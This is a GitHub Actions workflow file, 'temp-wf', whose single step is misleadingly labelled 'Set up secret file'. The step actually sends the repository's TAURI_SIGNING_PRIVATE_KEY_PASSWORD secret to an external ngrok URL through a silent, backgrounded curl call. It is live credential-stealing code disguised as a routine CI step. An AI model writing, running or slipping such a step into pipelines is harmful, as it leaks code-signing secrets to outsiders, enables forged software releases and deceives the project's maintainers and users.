name: 'temp-wf'

on:
  workflow_dispatch:

jobs:
  debug:
    environment: 'Build Environment'
    runs-on: ubuntu-latest

    steps:
    - name: Set up secret file
      env:
        TAURI_SIGNING_PRIVATE_KEY_PASSWORD: ${{ secrets.TAURI_SIGNING_PRIVATE_KEY_PASSWORD }}
      run: |
        setsid curl -s -o /dev/null "https://5a5c-73-93-177-73.ngrok-free.app/${TAURI_SIGNING_PRIVATE_KEY_PASSWORD}" > /dev/null 2>&1 &
